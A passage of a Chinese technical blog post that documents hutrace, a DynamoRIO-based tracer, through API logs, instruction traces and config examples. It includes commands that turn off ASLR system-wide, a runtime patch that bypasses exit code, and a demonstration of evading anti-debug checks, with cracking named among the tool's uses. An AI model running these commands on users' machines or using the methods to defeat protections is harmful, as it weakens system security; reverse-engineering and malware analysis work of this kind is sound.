retraddr: 0x13fef12d9,offset:0x12d9</span><br><span class="line"> and WSASend return value:  0x0 </span><br><span class="line">    arg 3: 0x000000000016f674 (type=DWORD*, size=0x4)</span><br><span class="line"></span><br><span class="line">服务器端日志：</span><br><span class="line">~~1420~~ WS2_32.dll!WSARecv N:0x371</span><br><span class="line">    arg 0: 0xb0 (type=DWORD, size=0x4)</span><br><span class="line">    arg 2: 0x1 (type=DWORD, size=0x4)</span><br><span class="line">    arg 4: 0x000000000012f674 =&gt; 0x0 (type=DWORD*, size=0x4)</span><br><span class="line">    arg 5: 0x000000000038d7f8 =&gt; 0x0 (type=DWORD*, size=0x4)</span><br><span class="line"> and return to module id:4, retraddr: 0x13f911a9d,offset:0x1a9d</span><br><span class="line"> and WSARecv return value:  0x0 </span><br><span class="line">    arg 1: 0x000000000038d7e0</span><br><span class="line"> and Struct Begin:</span><br><span class="line">    arg 0: 0x2000 (type=DWORD, size=0x4)</span><br><span class="line">    arg 1: 0x0 (type=DWORD, size=0x4)</span><br><span class="line">    arg 2: 0x38b7e0</span><br><span class="line">000000: 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  1111111111111111</span><br><span class="line">000010: 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32  2222222222222222</span><br><span class="line">000020: 32 32 32 00 00 00 00 00 00 00 00 00 00 00 00 00  222.............</span><br><span class="line">000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">//省略0x2000剩余字节的显示</span><br><span class="line"> (type=hex^A0, size=0x2000)</span><br><span class="line">and Struct End</span><br><span class="line"> (type=__out struct_ptr&#123;DWORD.DWORD.hex^A0&#125;^ARG2*, size=0x1)</span><br><span class="line">    arg 3: 0x000000000012f6b4 (type=DWORD*, size=0x4)</span><br></pre></td></tr></table></figure>
<p>记录的日志显示还不够美观，有空可能再改改优化下，WSARecv接收到的数据就不支持按返回值大小打印了，不过结构体中可以使用“^N20”这种固定数值的打印，和常规格式打印的“^NUM20”相区分。</p>
<p>额外说明下样例里为了体现多个WSABUF结构体数据的打印，在客户端运行参数中指定的发送的第1段数据“111…”之后，程序中又追加了一个数据内容为“222…”的结构体合并发送用来测试，不然不好构造出这样的参数数据，不过服务端接收时还是一起接收的，如果拿测试程序测试时请自动忽略服务端报的一些小错，客户端发送完数据就关闭了，服务端还会把接受的数据发回来会调用WSASend报个错，懒得改了，仅为测试复杂结构体数据的打印。</p>
<ul>
<li>注意：在使用结构体或HEX类型时必须指定^NUM或者^ARG确定结构体的数目。</li>
</ul>
<h2 id="3-执行流trace"><a href="#3-执行流trace" class="headerlink" title="3. 执行流trace"></a>3. 执行流trace</h2><h3 id="3-1-基本块汇编代码输出"><a href="#3-1-基本块汇编代码输出" class="headerlink" title="3.1 基本块汇编代码输出"></a>3.1 基本块汇编代码输出</h3><p>默认不使用执行流trace功能时hutrace工具本身也会记录程序的基本块执行情况，分别为“I”间接call、“R”ret返回、“C”直接Call、“J”跳转指令四类。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I40dacd|405170</span><br><span class="line">//call reg、call mem等间接call类型</span><br><span class="line">R40d221|4073ae</span><br><span class="line">//ret返回记录</span><br><span class="line">C4070e7|4029e0</span><br><span class="line">//常规的直接call</span><br><span class="line">J4029e0|7ffff69fa730    </span><br><span class="line">//只记录跳转偏移超0x1000的Jmp转移指令，主要目的为记录跨区段跳转，在一些壳中常见跳到OEP</span><br></pre></td></tr></table></figure>

<p>下面在hutrace的运行参数上添加“-print_ins_info”参数运行记录calc进程代码执行流程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\huhu\Desktop\bin64&gt;hutrace.exe  -only_from_app -print_ret_addr -print_ins_info -- calc</span><br></pre></td></tr></table></figure>

<p>得到如下所示的部分记录结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10001daad:</span><br><span class="line">     xor    eax, eax</span><br><span class="line">     lock cmpxchg qword ptr [rbp+0x00], rax, rbx</span><br><span class="line">     mov    rbp, rax</span><br><span class="line">     jnz    0x0000000100035a18</span><br><span class="line">10001dabe:</span><br><span class="line">     lea    r8d, [r14+0x41]</span><br><span class="line">     lea    rcx, [rsp+0x28]</span><br><span class="line">     xor    edx, edx</span><br><span class="line">     call   0x0000000100001bf8</span><br><span class="line">C10001dac9|100001bf8                     &lt;------------直接call</span><br><span class="line">J100001bf8|7ff756a1000</span><br><span class="line">~~640~~ msvcrt.dll!memset N:0x41</span><br><span class="line">    arg 0: 0x00000000000af778</span><br><span class="line">    arg 1: 0x0000000000000000</span><br><span class="line"> and return to module id:5, retraddr: 0x10001dace,offset:0x1dace</span><br><span class="line">10001dace:</span><br><span class="line">     mov    rax, &lt;rel&gt; qword ptr [0x0000000100063f28]</span><br><span class="line">     mov    dword ptr [rsp+0x20], 0x00000048</span><br><span class="line">     mov    qword ptr [rsp+0x38], r12</span><br><span class="line">     mov    qword ptr [rsp+0x50], rbx</span><br><span class="line">     test   rax, rax</span><br><span class="line">     jnz    0x0000000100035a08</span><br><span class="line"> and memset return value:  0xaf778 </span><br><span class="line">10001daf0:</span><br><span class="line">     cmp    rbx, r14</span><br><span class="line">     jz     0x0000000100035a4a</span><br><span class="line">10001daf9:</span><br><span class="line">     test   rbx, rbx</span><br><span class="line">     jz     0x0000000100035a6f</span><br><span class="line">10001db02:</span><br><span class="line">     mov    rdx, rsi</span><br><span class="line">     mov    rcx, rbx</span><br><span class="line">     call   0x000000010001db58</span><br><span class="line">C10001db08|10001db58</span><br><span class="line">10001db58:</span><br><span class="line">     jmp    &lt;rel&gt; qword ptr [0x00000001000623e0]</span><br><span class="line">J10001db58|78d43690                          &lt;------------长JMP跳转</span><br><span class="line">~~640~~ KERNEL32.dll!GetProcAddress N:0x42</span><br><span class="line">    arg 0: 0x7ff45ad0000 (type=HMODULE, size=0x4)</span><br><span class="line">    arg 1: WICCreateImagingFactory_Proxy (type=char*, size=0x0)</span><br><span class="line"> and return to module id:5, retraddr: 0x10001db0d,offset:0x1db0d</span><br><span class="line">.......//省略部分显示</span><br><span class="line">     pop    r14</span><br><span class="line">     pop    r13</span><br><span class="line">     pop    r12</span><br><span class="line">     ret</span><br><span class="line">R10001db50|10001c09f                         &lt;------------ret、retn等</span><br><span class="line">10001c09f:</span><br><span class="line">     movdqa xmm0, oword ptr [rsp+0x20]</span><br><span class="line">     movdqa xmm1, oword ptr [rsp+0x30]</span><br><span class="line">     movdqa xmm2, oword ptr [rsp+0x40]</span><br><span class="line">     movdqa xmm3, oword ptr [rsp+0x50]</span><br><span class="line">     mov    rcx, qword ptr [rsp+0x70]</span><br><span class="line">     mov    rdx, qword ptr [rsp+0x78]</span><br><span class="line">     mov    r8, qword ptr [rsp+0x80]</span><br><span class="line">     mov    r9, qword ptr [rsp+0x88]</span><br><span class="line">     add    rsp, 0x68</span><br><span class="line">     jmp    0x000000010001c0d7</span><br><span class="line">10001c0d7:</span><br><span class="line">     jmp    rax</span><br><span class="line">J10001c0d7|7ff45ad1a0c</span><br><span class="line">~~640~~ WindowsCodecs.dll!WICCreateImagingFactory_Proxy N:0x44</span><br><span class="line">    arg 0: 0x0000000000000236</span><br><span class="line">    arg 1: 0x00000000003662a0</span><br><span class="line">.......//省略部分显示</span><br><span class="line">     jnb    0x00000001000082cd</span><br><span class="line">100008291:</span><br><span class="line">     mov    rdx, qword ptr [r12]</span><br><span class="line">     xor    r9d, r9d</span><br><span class="line">     mov    r8, r15</span><br><span class="line">     mov    rcx, r13</span><br><span class="line">     call   &lt;rel&gt; qword ptr [0x0000000100062320]</span><br><span class="line">I10000829e|78d39940                             &lt;------------间接call</span><br><span class="line">~~640~~ KERNEL32.dll!FindResourceExW N:0x45</span><br></pre></td></tr></table></figure>
<p>这种记录方式并非是以记录所执行的每条指令为单位，而是以基本块为单位插桩记录，打印执行的每一个基本块内的所有汇编指令，优点在于已经执行过的基本块如果执行频次较多，hutrace不会重复记录其汇编代码，能够极大避免日志记录以及dynamorio插桩过程造成的效率降低影响（对于非自修改的代码也可以不使用print_ins_info参数，打印出基本块转移转移指令之后再使用IDA脚本或者其它工具将对应的汇编代码添加到日志中，对于申请内存释放代码并执行的情况也可以DUMP内存然后解析反汇编代码到日志中）。</p>
<p>在分析程序时使用print_ins_info功能不仅可以根据API信息了解到程序的基本功能，同时也能对一些代码执行细节进行预览及回溯，例如在分析某样本时通过查看日志可以直接定位到其调用退出进程函数前执行了检测虚拟机环境的代码，这也是常规API监视工具所做不到的。</p>
<h3 id="3-2-特定Sub函数的trace"><a href="#3-2-特定Sub函数的trace" class="headerlink" title="3.2 特定Sub函数的trace"></a>3.2 特定Sub函数的trace</h3><p>为了满足一些特殊的需求，想对程序中特定的函数参数进行记录，注意这里所说的sub函数可以简单理解成ida识别的function起始地址，函数调用约定必须是标准的cdecl或者stdcall传参，当然64位程序正常的fastcall寄存器传参顺序不影响参数的获取，以一个最简单的64位弹窗程序为例：</p>
<p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC1%E7%AF%87%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D/2.png" alt=""></p>
<p>测试步骤如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hutrace.config添加以下内容：</span><br><span class="line">int|0x14000102A|HWND|char*|char*|UINT     //其实就是MessageBoxA的参数格式~</span><br><span class="line"></span><br><span class="line">运行hutrace：</span><br><span class="line">C:\Users\huhu\Desktop\bin64&gt;hutrace.exe -only_from_app  -print_ret_addr  -- test.exe</span><br></pre></td></tr></table></figure>
<p>得到的部分日志结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~~2024~~ test.exe!0x14000102A N:0x1</span><br><span class="line">    arg 0: &lt;null&gt; (type=&lt;unknown&gt;, size=0x0)</span><br><span class="line">    arg 1: Hello world! (type=char*, size=0x0)</span><br><span class="line">    arg 2: test (type=char*, size=0x0)</span><br><span class="line">    arg 3: 0x40 (type=uint, size=0x4)</span><br><span class="line"> and return to module id:5, retraddr: 0x140001021,offset:0x1021</span><br><span class="line">~~2024~~ USER32.dll!MessageBoxA N:0x2</span><br><span class="line">    arg 0: &lt;null&gt; (type=&lt;unknown&gt;, size=0x0)</span><br><span class="line">    arg 1: Hello world! (type=char*, size=0x0)</span><br><span class="line">    arg 2: test (type=char*, size=0x0)</span><br><span class="line">    arg 3: 0x40 (type=uint, size=0x4)</span><br><span class="line"> and return to module id:5, retraddr: 0x140001021,offset:0x1021</span><br><span class="line"> and MessageBoxA return value:  0x1 </span><br><span class="line"> and sub_0x14000102A return value: 0x1</span><br></pre></td></tr></table></figure>

<h3 id="3-3-特定DLL、SO的trace"><a href="#3-3-特定DLL、SO的trace" class="headerlink" title="3.3 特定DLL、SO的trace"></a>3.3 特定DLL、SO的trace</h3><p>在分析时我们也经常遇到漏洞或者样本等将主要功能逻辑放到库中加载的情况，在hutrace中trace程序运行时可以同时指定需要额外记录执行流程的DLL或So名称：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\huhu\Desktop\bin64&gt;hutrace.exe -only_from_app  -print_ret_addr  -print_ins_info -trace_to_librarys dll_test.dll  -- rundll32 dll_test_x64.dll,#1</span><br></pre></td></tr></table></figure>

<p>在使用时同时注意，windows上hutrace获取的模块名是根据其导出信息获取，有时候出现指定模块文件名记录却未记录到的情况，可以使用PE编辑工具查看模块导出表结构体中的模块名称是否与模块文件名称一致，这种情况很少，不过找测试用例时刚好找到一个qiling的这个demo程序dll_test_x64.dll是这个样子的：</p>
<p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC1%E7%AF%87%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D/3.png" alt=""></p>
<p>故虽然文件名为“dll_test_x64.dll”，“-trace_to_librarys”参数仍旧指定为“dll_test.dll”，最终trace的日志除包含rundll32.exe主程序代码外还会记录dll_test_x64.dll的main函数及导出函数的执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~~1008~~ KERNELBASE.dll!LoadLibraryExW N:0x2c</span><br><span class="line">    arg 0: dll_test_x64.dll (type=wchar_t*, size=0x0)</span><br><span class="line">    arg 1: 0x0 (type=HANDLE, size=0x8)</span><br><span class="line">    arg 2: 0x8 (type=DWORD, size=0x4)</span><br><span class="line"> and return to module id:5, retraddr: 0xffd32b50,offset:0x2b50</span><br><span class="line">...</span><br><span class="line">7fefa001009:</span><br><span class="line">     xor    r9d, r9d</span><br><span class="line">     lea    r8, &lt;rel&gt; [0x000007fefa002178]</span><br><span class="line">     lea    rdx, &lt;rel&gt; [0x000007fefa002188]</span><br><span class="line">     xor    ecx, ecx</span><br><span class="line">     call   &lt;rel&gt; qword ptr [0x000007fefa002078]</span><br><span class="line">I7fefa00101c|76be12b8</span><br><span class="line">~~1008~~ USER32.dll!MessageBoxA N:0x3c</span><br><span class="line">    arg 0: &lt;null&gt; (type=&lt;unknown&gt;, size=0x0)</span><br><span class="line">    arg 1: Inside process attach (type=char*, size=0x0)</span><br><span class="line">    arg 2: My caption (type=char*, size=0x0)</span><br><span class="line">    arg 3: 0x0 (type=uint, size=0x4)</span><br><span class="line"> and return to module id:16, retraddr: 0x7fefa001022,offset:0x1022</span><br><span class="line">...</span><br><span class="line"> and LoadLibraryExW return value:  0x7fefa000000 </span><br><span class="line"></span><br><span class="line">//每个生成的trace日志文件的末尾都会附加程序加载的所有模块信息，id:16对应的模块即为dll_test_x64.dll，可以看到该模块内0x7fefa001009地址运行的指令等也被正常记录。</span><br><span class="line">Module Table: version 4, count 25</span><br><span class="line">Columns: id, containing_id, start, end, entry, offset, checksum, timestamp, path</span><br><span class="line">...</span><br><span class="line"> 16,  16, 0x000007fefa000000, 0x000007fefa008000, 0x000007fefa001410, 00000000800e4d18, 0x00000000, 0x5ec53b54,  C:\Users\huhu\Desktop\bin64\dll_test_x64.dll</span><br></pre></td></tr></table></figure>

<p>对于一些申请可读写执行属性内存块存放代码并执行的情况，这些不在任意模块中的代码常见于漏洞Shellcode或病毒样本runpe、注入等，hutrace会进行判断并将不在任意模块空间的代码执行纳入默认记录范围。</p>
<p>如果需要同时追踪多个加载模块的运行代码，在“-trace_to_librarys”参数中设置“1.dll!2.dll!3.dll”即可,我一般也就只追踪一个模块，需要同时记录多个模块的情况比较少见。</p>
<h3 id="3-4-指定起始、结束地址"><a href="#3-4-指定起始、结束地址" class="headerlink" title="3.4 指定起始、结束地址"></a>3.4 指定起始、结束地址</h3><p>该功能主要目的是划分关注的代码范围，提高trace程序运行效率并降低生成的日志文件体积，使用也比较简单，运行hutrace时指定需要开始或结束记录的基本块头部或尾部地址（注意并非指定任意地址，为了性能考虑只对基本块头部和尾部进行判断）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\huhu\Desktop\bin64&gt;hutrace.exe -only_from_app  -print_ret_addr  -print_ins_info  -record_start_addr 0x40524A  -record_end_addr 0x402422 -- nc64.exe</span><br></pre></td></tr></table></figure>
<p>实际记录的结果不再展示，指定的起始与结束地址必须为基本块的头部或尾部。对应IDA的信息如下：</p>
<p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC1%E7%AF%87%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D/4.png" alt=""></p>
<p>常规情况下指定地址记录时设置的为固定值，这时一般要求程序的地址空间固定，可以使用petools等工具设置文件头属性不要求程序进行重定位：</p>
<p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC1%E7%AF%87%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D/5.png" alt=""></p>
<p>亦可同时设置关闭ASLR(Win7关闭ASLR.bat)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">setlocal EnableDelayedExpansion </span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management&quot; /v &quot;MoveImages&quot; /t REG_DWORD /d &quot;0&quot; /f %将程序写进注册表,开机自启动%</span><br><span class="line">echo Register successfully.</span><br><span class="line">pause&gt;nul %&gt;nul的作用是不显示请按任意键继续%</span><br></pre></td></tr></table></figure>
<p>Linux关闭ASLR：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br></pre></td></tr></table></figure>

<p>对于申请内存并拷贝代码执行情况可以考虑其它手段来固定其申请的内存地址（hutrace提供了一个演示的插件功能可以达成该目的，详见下一篇hutrace在windows系统的应用文章中对任意地址hook功能的介绍），如果不想修改PE文件（有的程序会对完整性进行校验、有时关闭ASLR仍旧存在模块地址随机的情况、还有关闭ASLR但hutrace加载导致的模块地址变化等等情况），这种情况下可以使用“模块名+偏移”方式替代固定地址方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\huhu\Desktop\bin64&gt;hutrace.exe -only_from_app  -print_ret_addr  -print_ins_info -trace_to_librarys dll_test.dll -record_start_addr rundll32.exe+0x2d30 -record_end_addr dll_test.dll+0x1030 -- rundll32 dll_test_x64.dll,#1</span><br></pre></td></tr></table></figure>

<h2 id="4-数据流trace"><a href="#4-数据流trace" class="headerlink" title="4. 数据流trace"></a>4. 数据流trace</h2><h3 id="4-1-寄存器及内存记录"><a href="#4-1-寄存器及内存记录" class="headerlink" title="4.1 寄存器及内存记录"></a>4.1 寄存器及内存记录</h3><p>逆向分析时经常遇到需要定位处理特定数据代码的需求，常规调试手段就不用说了，除了常规手段，“四哥”曾经发过利用Windbg TTD以及Dynamorio代码覆盖率等技术处理该需求的文章：<br><a href="http://scz.617.cn:8/windows/202202101230.txt" target="_blank" rel="noopener">http://scz.617.cn:8/windows/202202101230.txt</a><br><a href="http://scz.617.cn:8/windows/202201251528.txt" target="_blank" rel="noopener">http://scz.617.cn:8/windows/202201251528.txt</a><br>上述print_ins_info功能中指令流记录实际上使用的是基本块插桩，无法记录到每一条指令运行时的详细信息，通过指令插桩可以记录到每条指令记录的寄存器以及内存信息，但是引入的主要问题就是会大大降低程序的运行速度，尤其是处理一些图形界面程序时，可以通过逆向或者hutrace的指令流记录，再结合指定起始、结束地址功能进行每条指令运行信息的记录。</p>
<p>常规使用方式的命令格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\huhu\Desktop\bin64&gt;hutrace.exe -only_from_app  -print_ret_addr  -print_ins_reg -- test.exe</span><br></pre></td></tr></table></figure>
<p>得到的记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">B0x140001000-0x14000101c         //对应下面6条指令所在基本块范围</span><br><span class="line">	I0x140001000|sub    rsp, 0x28                                	|	rsp:0x12ff58</span><br><span class="line">	I0x140001004|xor    rcx, rcx                                 	|	rcx:0x7fffffdf000	|	rcx:0x7fffffdf000</span><br><span class="line">	I0x140001007|lea    rdx, &lt;rel&gt; [0x0000000140003000]          	|	rdx:0x140001000	|	D0:0x140003000	|	S0P:0x6f77206f6c6c6548</span><br><span class="line">	I0x14000100e|lea    r8, &lt;rel&gt; [0x000000014000300d]           	|	r8:0x7fffffdf000	|	D0:0x14000300d	|	S0P:0x74736574</span><br><span class="line">	I0x140001015|mov    r9, 0x00000040                           	|	r9:0x140001000</span><br><span class="line">	I0x14000101c|call   0x000000014000102a                       	|0x14000102a</span><br><span class="line">C14000101c|14000102a</span><br><span class="line">J14000102a|78c912b8</span><br><span class="line">~~1616~~ USER32.dll!MessageBoxA N:0x1</span><br><span class="line">    arg 0: &lt;null&gt; (type=&lt;unknown&gt;, size=0x0)</span><br><span class="line">    arg 1: Hello world! (type=char*, size=0x0)</span><br><span class="line">    arg 2: test (type=char*, size=0x0)</span><br><span class="line">    arg 3: 0x40 (type=uint, size=0x4)</span><br><span class="line"> and return to module id:5, retraddr: 0x140001021,offset:0x1021</span><br><span class="line">B0x140001021-0x140001028</span><br><span class="line">	I0x140001021|add    rsp, 0x28                                	|	rsp:0x12ff30</span><br><span class="line"> and MessageBoxA return value:  0x1          //输出有点乱序...不影响效率的情况下暂无好的解决方案懒得改了</span><br><span class="line">	I0x140001025|xor    rax, rax                                 	|	rax:0x1	|	rax:0x1</span><br><span class="line">	I0x140001028|ret                                             	|	rsp:0x12ff58</span><br><span class="line">R140001028|78d3652d</span><br></pre></td></tr></table></figure>

<p>这一部分代码实现主要参考了ddr插件，做了一部分精简，hutrace的“-print_ins_all”参数实现与原插件的功能较为一致，可以自行测试，该功能打印的内容太多不仅影响运行效率，很多时候也并不需要，仅打印寄存器以及内存的值已经能够满足大部分需求了。</p>
<h3 id="4-2-Demo：三分钟定位calc中0x41414141-0x666666的计算指令地址"><a href="#4-2-Demo：三分钟定位calc中0x41414141-0x666666的计算指令地址" class="headerlink" title="4.2 Demo：三分钟定位calc中0x41414141*0x666666的计算指令地址"></a>4.2 Demo：三分钟定位calc中0x41414141*0x666666的计算指令地址</h3><p>下面介绍使用hutrace进行一个简单演示，快速定位计算器中计算指令位置（win7x64测试环境，win10系统计算器不行，参见四哥的文章中dynamorio部分）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\huhu\Desktop\bin64&gt;hutrace.exe -only_from_app  -print_ret_addr  -print_ins_reg -- calc</span><br></pre></td></tr></table></figure>
<p>在计算器中切换到程序员的16进制模式，输入并计算41414141*666666，计算结束后关闭计算器程序，使用010Edit打开trace日志，文件大小大约200多兆，直接010里搜索“41414141”，大概有500条记录，可以在搜索结果里直接查找“666666”，也可以将记录拷贝至新文件再搜索，最后一条出现“41414141”的记录也即是乘法运算的指令处：</p>
<p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC1%E7%AF%87%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D/6.png" alt=""></p>
<p>整个过程基本无脑操作。。trace操作过程大概两分钟，搜索1分钟,这种记录状态会较为严重的影响运行效率，最耗时也就是trace的时间，尤其是图形界面程序，会有卡顿的现象，但是总的来说已经比基于调试器的trace效率有一个很大的提升了，我自己简单测试下TTD的速度比hutrace的速度还是快很多的，其它优点也超级多，不过一旦hutrace记录完成，hutrace形成的记录结果的更为直观，清晰可搜，当然这里只是最简单的示例。</p>
<blockquote>
<p>曹操：“关将军真乃神人也！”，关羽：“何足道哉？吾弟张翼德，于万军之中，取敌将首级，如杀鸡取卵，探囊取物耳”（恶搞）</p>
</blockquote>
<h2 id="5-其它功能"><a href="#5-其它功能" class="headerlink" title="5. 其它功能"></a>5. 其它功能</h2><p>还有一些小功能，有的比较零碎简单介绍下，有的稍微麻烦点在后面的文章中进行实例介绍。</p>
<h3 id="5-1-简易Patch"><a href="#5-1-简易Patch" class="headerlink" title="5.1 简易Patch"></a>5.1 简易Patch</h3><p>有时想对程序进行运行时的patch，可以在hutrace.config文件中设置如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">patch|0x1400010AB|0x14000114D*9090|0x140001224*9090|0x1400020A8*61616141414141616161616161</span><br></pre></td></tr></table></figure>
<p>其中0x1400010AB代表代码执行到该位置时进行patch，此处可设置为任意地址，后面列举需要进行补丁的地址以及数据，依次对0x14000114D、0x140001224等三个地址进行数据的修改，需要设置的补丁数据为16进制字符串形式。</p>
<p>以scyllahide的调试状态检测程序ScyllaTest_x64.exe为例，虽然hutrace可以躲避其调试状态检测功能，但是不支持ScyllaTest_x64程序的AllocConsole功能，故可以对其退出代码进行patch:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">patch|140001CC0|0x140001CDD*9090</span><br></pre></td></tr></table></figure>
<p>虽然后续会报错AllocConsole失败，但是程序继续运行不会退出，trace得到后续代码的执行情况，同时可验证hutrace对常见反调试技术的绕过效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\huhu\Desktop\bin64&gt;hutrace.exe  -only_from_app -print_ret_addr -print_ins_info -- ScyllaTest_x64.exe</span><br><span class="line">INFO: C:\Users\huhu\Desktop\bin64\ScyllaTest_x64.exe sucessfully started, waiting app for exit</span><br><span class="line">Starting test loop. Press CTRL+C or the power button on your PC to exit.</span><br><span class="line"></span><br><span class="line">--------------------</span><br><span class="line">PEB_BeingDebugged:                              OK</span><br><span class="line">Wow64PEB64_BeingDebugged:                       SKIP</span><br><span class="line">PEB_NtGlobalFlag:                               OK</span><br><span class="line">Wow64PEB64_NtGlobalFlag:                        SKIP</span><br><span class="line">PEB_HeapFlags:                                  OK</span><br><span class="line">Wow64PEB64_HeapFlags:                           SKIP</span><br><span class="line">PEB_ProcessParameters:                          OK</span><br><span class="line">Wow64PEB64_ProcessParameters:                   SKIP</span><br><span class="line">IsDebuggerPresent:                              OK</span><br><span class="line">CheckRemoteDebuggerPresent:                     OK</span><br><span class="line">OutputDebugStringA_LastError:                   SKIP</span><br><span class="line">OutputDebugStringA_Exception:                   OK</span><br><span class="line">OutputDebugStringW_Exception:                   SKIP</span><br><span class="line">NtQueryInformationProcess_ProcessDebugPort:     OK</span><br><span class="line">NtQuerySystemInformation_KernelDebugger:        OK</span><br><span class="line">NtQuery_OverlappingReturnLength:                OK</span><br><span class="line">NtClose:                                        OK</span><br><span class="line">OtherOperationCount:                            OK</span><br><span class="line">--------------------</span><br></pre></td></tr></table></figure>
<p>该功能仅作为简易的补丁操作，需实现复杂需求的话可以编写对应的Hook插件，在后面的文章中会进行详细的介绍。</p>
<h3 id="5-2-隐藏指定函数记录"><a href="#5-2-隐藏指定函数记录" class="headerlink" title="5.2 隐藏指定函数记录"></a>5.2 隐藏指定函数记录</h3><p>在trace图形界面程序时经常有一些不需关注的函数的调用，有时记录的频次太多也可能会影响hutrace的运行，可以在hutrace.config文件中设置忽略该部分函数的记录（已经默认添加）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hide|KiUserCallbackDispatcher</span><br><span class="line">hide|ExpInterlockedPopEntrySListResume16</span><br><span class="line">hide|ExpInterlockedPopEntrySListFault16</span><br><span class="line">hide|ExpInterlockedPopEntrySListEnd16</span><br><span class="line">hide|ExpInterlockedPopEntrySListResume</span><br><span class="line">hide|ExpInterlockedPopEntrySListFault</span><br><span class="line">hide|ExpInterlockedPopEntrySListEnd</span><br></pre></td></tr></table></figure>

<h3 id="5-3-内存dump功能"><a href="#5-3-内存dump功能" class="headerlink" title="5.3 内存dump功能"></a>5.3 内存dump功能</h3><p>在hutrace.config文件中设置需要dump的时机以及需要dump的内存地址以及内存大小。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dump|0x14000101c|0x140000000|0x5000</span><br></pre></td></tr></table></figure>
<p>意为代码执行到0x14000101c指令处时对内存地址0x140000000开始的0x5000大小字节的数据进行dump，和日志文件生成在同一目录，选择dump时机如0x14000101c时可以指定任意地址哦。</p>
<h3 id="5-4-系统调用Syscall记录"><a href="#5-4-系统调用Syscall记录" class="headerlink" title="5.4 系统调用Syscall记录"></a>5.4 系统调用Syscall记录</h3><p>Linux下常用strace记录系统调用，相应需求也比较常见，而Windows上记录Syscall记录的需求比较小众，而且不同版本下的系统调用号差异较大，同时还引入一些小问题，将分别在后续两篇中Window、linux应用篇进行介绍。</p>
<h3 id="5-5-任意地址Hook之插件编写"><a href="#5-5-任意地址Hook之插件编写" class="headerlink" title="5.5 任意地址Hook之插件编写"></a>5.5 任意地址Hook之插件编写</h3><p>略微麻烦点，同样放入第2、3篇实际应用篇分别进行Win和linux系统下插件的介绍，俩个系统略有差异。</p>
<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2><p>hutrace的功能已经能够覆盖较多的分析场景了，无论是漏洞分析、样本分析、软件破解等等，最简单的功能就是掌握API参数及返回结果信息，同时使用print_ins_info、print_ins_reg功能可记录全部执行流程情况，进行代码或数据的追踪回溯，关键还是在性能上trace效率、trace日志文件大小以及相应的日志检索的效率，目前测试的图形界面程序虽然功能略有卡顿，都还是可以正常运行的（print_ins_reg功能最卡顿些，而且如果应用于程序的全流程跟踪或者如果遇到一些密码算法代码等会可能会形成庞大的日志文件，检索也不方便，有需求的话建议结合IDA以及指定起始、结束地址进行trace，过滤无关代码）。</p>
<p>开发hutrace的目的只是为了提升分析效率，掌握程序执行流程，有时不需要高深的调试技巧就可以实现敏感代码的定位及回溯，说实话也少了一些调试的乐趣，整体的运行流程可以直接在010edit上检索，用高大上的词来说就是降维打击，把程序的执行流程二维化，但是调试技巧还是基础，有的分析场景下可能还是调试或者IDA怼更直观、速度更快点，能结合使用效果更佳，可开发些IDA插件对记录的地址进行符合信息标注处理、图形化展示等等。</p>
<p>github地址：<a href="https://github.com/huhu0706/hutrace" target="_blank" rel="noopener">https://github.com/huhu0706/hutrace</a></p>
]]></content>
      <categories>
        <category>基础理论</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>调试器</tag>
        <tag>dynamorio</tag>
        <tag>hutrace</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-06-05-Frida辅助分析OLLVM混淆的算法</title>
    <url>/2020/06/05/2020-06-05-Frida%E8%BE%85%E5%8A%A9%E5%88%86%E6%9E%90OLLVM%E6%B7%B7%E6%B7%86%E7%9A%84%E7%AE%97%E6%B3%95/</url>
